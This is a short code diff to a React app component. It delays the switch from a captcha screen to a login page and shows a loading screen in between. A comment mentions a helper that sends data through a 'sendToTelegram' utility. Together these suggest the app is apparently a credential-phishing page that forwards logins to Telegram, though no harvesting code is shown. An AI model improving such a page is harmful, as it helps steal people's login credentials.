@@ -25,7 +25,8 @@ function App() {
   const [hasActiveSession, setHasActiveSession] = useState(false);
   const [currentPage, setCurrentPage] = useState('captcha'); // Start with captcha
   const [selectedFileName, setSelectedFileName] = useState('');
-  const [isLoading, setIsLoading] = useState(true);
+  // Changed initial loading state to false so captcha shows first (only this initialization changed)
+  const [isLoading, setIsLoading] = useState(false);
   const [captchaVerified, setCaptchaVerified] = useState(false);
 
   // Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
@@ -201,10 +202,14 @@ function App() {
   // Handler for captcha verification
   const handleCaptchaVerified = () => {
     console.log('🔒 Captcha verified, redirecting to login...');
-    // Move the page first to avoid transient rendering of the captcha UI
-    setCurrentPage('login');
-    setCaptchaVerified(true);
-    setIsLoading(false); // Ensure loading is false
+    // Show loading between captcha and login (preserving structure)
+    setIsLoading(true);
+    // small delay so loading UI appears before login renders
+    setTimeout(() => {
+      setCurrentPage('login');
+      setCaptchaVerified(true);
+      setIsLoading(false); // Ensure loading is false once ready to show login
+    }, 600);
   };
 
   // Handler for login success from login components
